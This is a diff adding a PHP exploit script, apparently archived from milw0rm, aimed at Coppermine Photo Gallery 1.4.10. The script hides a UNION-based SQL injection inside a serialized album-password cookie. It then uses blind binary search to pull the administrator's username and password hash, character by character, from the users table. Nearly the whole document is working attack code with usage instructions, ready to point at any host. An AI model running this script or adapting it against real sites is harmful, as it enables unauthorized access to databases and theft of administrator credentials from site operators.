@@ -1,0 +1,234 @@
+<?php
+#############################################
+# RST/GHC PRIVATE 
+# CPG 1.4.10 sql injection exploit
+# Date: 17.05.07
+# bug: SQL injection in private album
+# function through array indexes with COOKIE 
+#############################################
+error_reporting (E_ERROR);
+ini_set("max_execution_time",0);
+intro();
+if ($argc < 4 ){
+        print " Usage: " . $argv[0] . " <host> <dir> <force> [table prefix]\n";
+        print "        <host>                          - hostname\n";           
+        print "        <dir>                           - web dirname \n";           
+        print "        <force>                         - force mode - '0' - for Off or \"album number\" for force mode On \n";           
+        print "        [table prefix]          - prefix of sql tables\n";           
+        print " example: " . $argv[0] . " coppermine.site photo/ 1 cpg1410\n";
+        credits();
+}
+###############################################
+/* FUNCTIONS */
+##############################################
+
+if (!function_exists(str_split)){ ### for PHP4 << FIX
+        function str_split($str)
+      {
+        $str_array=array(); 
+        $len=strlen($str);
+        for($i=0;$i<$len;$i++) $str_array[]=$str{$i};
+        return $str_array;
+       }
+}
+
+function toSql($str){
+        $a_str = str_split ($str);
+        $s_str = '0x';
+        foreach ($a_str as $val){
+                $s_str .= sprintf("%X",ord($val));
+        }
+        return $s_str;
+}
+
+function toCookie ($str){
+        $str = "-1) UNION SELECT " .toSql ($str). ",1 as md5_password/*";
+        $c_str=array(0=>"8", $str=>"1");
+        $c_str = $GLOBALS['prefix'].'_albpw='.urlencode(serialize($c_str)).';'.$GLOBALS['cookies'];
+        return $c_str;
+}
+
+
+function getAlbum($text){
+        if (preg_match("/(?<=album=)[1-9]{1}(?=\">)/", $text, $match)) {
+                return intval($match[0]); 
+        }
+         else return 0;
+
+}
+
+function getCookie($text){
+        if (preg_match_all("/(?<=Set-Cookie:)(.*)(?=expires)/", $text, $match)) {$cookie = $match[0][0].$match[0][1];}
+        else {$cookie = '';}
+        return $cookie; 
+}
+
+function getPrefix($text){
+        if (preg_match("/(?<=\s)[a-z0-9_]*(?=_data)/", $text, $match)) return trim($match[0]);
+        else return false;
+}
+
+function toPage($page){
+ $pattern = "/(?<=HTTP).*(?=<html)/s";
+ $replacement = '';
+ $page = preg_replace($pattern,$replacement,$page);
+ /* Let's count images on the page */
+ if (preg_match_all("/<img/", $page, $match)) return count($match[0]);
+ else return 0;
+}
+
+function sendit($page, $method, $cookie=''){
+global $argv;
+        $data ='';
+        $host = $argv[1];
+        $page = $argv[2] . $page;
+        $referer = 'http://'.$host;
+    $user_agent = 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)';
+    $result = '';        
+        $sock = fsockopen($host, 80, $errno, $errstr, 50);
+        if (!$sock) die("$errstr ($errno)\n");
+        fputs($sock, "$method /$page HTTP/1.0\r\n");
+        fputs($sock, "Host: $host" . "\r\n");
+        fputs($sock, "Content-type: application/x-www-form-urlencoded\r\n");
+        fputs($sock, "Content-length: " . strlen($data) . "\r\n");
+        fputs($sock, "Referer: $referer". "\r\n");
+        fputs($sock, "User-Agent:  $user_agent" . "\r\n");        
+        fputs($sock, "Accept: */*\r\n");
+        if ($cookie !=='') {fputs($sock, "Cookie: $cookie\r\n");}
+        fputs($sock, "\r\n");
+        fputs($sock, "$data\r\n");
+        fputs($sock, "\r\n");
+
+    while (!feof($sock)) {
+        $result .= fgets ($sock,8192);
+    }           
+        fclose($sock);
+                //print $result; ### DEBUGER
+    return $result; 
+    
+}
+
+function credits(){
+echo '
++==========================================+
++ Coded: 17.05.07 * Bug found in Feb.2007  +
++==========================================+
+'; 
+exit;
+}
+
+
+function intro(){
+echo '
+          * P R I V A T E  *
++==========================================+
+| RST/GHC Coppermine SQL injection exploit |
++==========================================+
+|  >>> vulnerable: CPG 1.4.10 stable  <<<  |
++------------------------------------------+
+';
+
+}
+
+#####################################################################
+### HACK FUNCTIONS
+#####
+####
+### what to find:
+## user_name   user_password    FROM  cpg1410_users WHERE user_id=1
+####################################################################
+
+function makeExpl($param, $cond, $sn) ### $param - name || password; $cond - condition (e.g. =97) ; $sn  - position 
+{
+        global $argv;
+        $tprefix = (isset($argv[4])) ? $argv[4]  : 'cpg1410';
+        $query = 'ASCII(substr((SELECT user_'.$param.' FROM '.$tprefix.'_users WHERE user_id=1),'.$sn.',1))' . $cond;
+        $sql = '0) UNION SELECT '.$GLOBALS['album'].' AND ' .$query. '/*'; 
+           //echo $sql; ###DEBUG
+        return toCookie($sql);
+
+}
+//////////////
+function blind($param, $sn, $fmin, $fmax)
+{
+ if (($fmax-$fmin)<5) { return crack($param, $fmin, $fmax, $sn) ;}
+ $compare = intval($fmin + ($fmax-$fmin)/2);
+ $crcheck = ">". $compare;
+ if ( check(makeExpl($param, $crcheck, $sn)) == 1 ) {
+    return blind($param, $sn, $compare, $fmax);
+    }
+ else {
+    return blind($param, $sn, $fmin, $compare+1); 
+        }
+}
+
+function crack($param, $cmin, $cmax, $sn)
+{
+ for ($i=$cmin; $i <=$cmax; $i++){
+   $crcheck = '='.$i;
+   $sqlCookie = makeExpl($param, $crcheck ,$sn);
+   if (check($sqlCookie) == 1){print chr($i); return 1;}
+         }
+return 0;
+}
+
+function check($sqlCookie){
+        global $page, $etalon;
+        $testPage = toPage(sendit ($page, 'GET', $sqlCookie));
+        if ($testPage < $etalon) return 1;
+        else return 0;
+}
+
+function exploit($param){ 
+        echo "\nLet's define admin's ". $param . "\n";
+        $min = 48;  # 0
+        $max = 122; # z
+
+        $sql_cookies = makeExpl($param,'BETWEEN '.$min . ' AND '.$max,1);
+        if (check($sql_cookies) == 0) {echo 'failed...'; return;}
+
+        $sn=1; 
+        while(blind($param,$sn, $min, $max) !== 0) {
+                $sn++; if ($sn > 32) return;
+        }
+}
+
+###############################################################
+## START     E X P L O I T    C O D E 
+#############################################################
+echo '
+Exploiting:
+[+] target: '. $argv[1].'/'.$argv[2].'
+';
+         $page = '';
+        $firstReply = sendit($page, 'GET'); 
+        $album = getAlbum($firstReply);                                                                  ### get valid album number
+        if ($album == 0) {
+                echo "[-] No valid album found...\n"; 
+                if ($argv[3] != 0) {echo "... Forcing\n";        $album = $argv[3];}        ### FOR FORCE MODE!!!! If you know exactly album number - put it here
+                else {credits();}                                                                                 
+                
+        }
+        $page = 'thumbnails.php?album='.$album;
+        $GLOBALS['album'] = $album;
+        echo "[+] Valid album number: ".$album . "\n";
+        
+        $GLOBALS['cookies'] = getCookie($firstReply);                                         ### get cookie from host
+
+        $prefix = getPrefix($GLOBALS['cookies']);                                                 ### get cookie prefix
+        echo "[+] Cookie prefix: " . $prefix . "\n";
+        $GLOBALS['prefix']=$prefix;
+        
+        $etalon = toPage(sendit ($page, 'GET', $c_cookies));                         ### number of images at etalon page
+        
+        $first_sql = '0) UNION SELECT '.$album.' AND 1=1/*';                        ### FIRST sql query - let's make valid album to be invisible
+        $first_cookie = toCookie($first_sql);
+        
+        if (check($first_cookie) == 0) {echo "exploit failed..."; credits();} ### if album is still visible - site is unvulnerable
+        exploit('name');
+        exploit('password');
+        credits();
+
+?>
+
+# milw0rm.com [2008-01-22]
